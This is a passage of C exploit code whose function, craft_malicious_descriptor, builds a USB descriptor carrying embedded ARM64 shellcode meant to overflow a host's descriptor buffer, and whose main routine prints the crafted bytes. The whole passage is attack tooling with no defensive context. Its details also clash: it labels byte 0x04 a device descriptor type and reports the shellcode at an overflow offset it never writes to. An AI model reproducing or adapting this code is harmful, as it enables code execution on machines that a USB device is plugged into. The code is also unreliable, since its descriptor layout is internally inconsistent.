int craft_malicious_descriptor(uint8_t *out, size_t max_len, size_t *out_len) {
    if (max_len < USB_DESC_BUFFER_SIZE) return -1;

    uint8_t *desc = out;
    size_t pos = 0;

    desc[pos++] = 0x09;
    desc[pos++] = 0x04;

    for (int i = 0; i < 7; i++) {
        desc[pos++] = 0x00;
    }

    size_t shellcode_len = sizeof(arm64_shellcode);
    size_t overflow_len = USB_DESC_BUFFER_SIZE - USB_DESC_OVERFLOW_OFFSET;
    if (shellcode_len > overflow_len) shellcode_len = overflow_len;

    memcpy(&desc[pos], arm64_shellcode, shellcode_len);
    pos += shellcode_len;

    *out_len = pos;
    return 0;
}

int main(int argc, char **argv) {
    uint8_t descriptor[USB_DESC_BUFFER_SIZE];
    size_t desc_len = 0;

    if (craft_malicious_descriptor(descriptor, sizeof(descriptor), &desc_len) != 0) {
        fprintf(stderr, "Failed to craft descriptor\n");
        return 1;
    }

    printf("Malicious USB Device Descriptor (%zu bytes)\n", desc_len);
    printf("bLength: 0x%02X\n", descriptor[0]);
    printf("bDescriptorType: 0x%02X (DEVICE)\n", descriptor[1]);

    printf("\nFirst 32 bytes:\n");
    for (int i = 0; i < 32; i++) {
        printf("%02X ", descriptor[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    printf("\nShellcode embedded at offset %d (%zu bytes)\n",
           USB_DESC_OVERFLOW_OFFSET, sizeof(arm64_shellcode));
    printf("Total descriptor size: %zu bytes (buffer: %d)\n",
           desc_len, USB_DESC_BUFFER_SIZE);

    return 0;
}
